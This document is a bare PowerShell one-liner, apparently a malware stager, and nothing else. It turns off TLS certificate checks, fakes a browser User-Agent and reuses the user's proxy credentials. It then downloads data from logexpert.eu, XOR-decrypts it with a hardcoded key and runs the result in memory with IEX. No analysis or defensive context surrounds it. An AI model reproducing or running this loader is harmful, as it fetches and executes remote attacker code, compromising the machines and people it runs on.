
$WC=New-OBjeCt SysteM.NeT.WeBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HeADers.Add('User-Agent',$u);$WC.PrOxY = [SYsTem.NeT.WEBREquEsT]::DeFAuLtWEBPROxy;$WC.PrOXY.CrEDEnTIALS = [SYstEm.NeT.CREdenTiALCaCHE]::DefauLTNeTWorkCREdenTiALS;$K='4cb33a00ce89ad59228ea02a42b2679d';$i=0;[cHar[]]$B=([CHaR[]]($WC.DOwnloadStRINg("https://logexpert.eu/index.asp")))|%{$_-BXor$k[$I++%$K.LenGtH]};IEX ($B-JOIN'')

